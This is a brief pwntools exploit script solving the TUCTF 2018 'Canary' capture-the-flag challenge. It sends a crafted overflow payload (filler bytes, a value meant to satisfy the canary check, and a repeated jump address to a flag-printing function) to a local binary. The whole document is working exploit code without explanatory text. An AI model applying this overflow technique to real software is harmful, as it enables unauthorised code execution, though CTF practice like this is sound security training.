# TUCTF 2018 - Canary

from pwn import *

p = process('./canary')
p.recvuntil('Password?')

flag = 0x080486b7
payload = '0'*40
payload += '\x00'*4
payload += p32(2)
payload += p32(flag)*3

p.sendline(payload)
p.interactive()